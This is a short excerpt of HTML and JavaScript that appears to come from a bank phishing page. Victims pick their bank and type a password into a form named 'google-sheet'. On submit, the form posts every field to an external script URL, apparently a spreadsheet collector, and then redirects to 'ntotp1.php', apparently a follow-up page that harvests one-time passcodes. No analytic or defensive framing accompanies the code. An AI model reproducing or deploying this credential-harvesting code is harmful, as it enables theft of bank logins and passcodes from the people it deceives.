...
<select name="abank" id="bank" required>
   ...
   <label for="email"><b>Password *</b></label>
    <input type="text" placeholder="Enter Password" name="pswad" autocomplete="off" required>
            ...
            const form = document.forms['google-sheet']
             ...
             form.addEventListener('submit', e => {
               ...
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response =>  window.location.href='ntotp1.php')
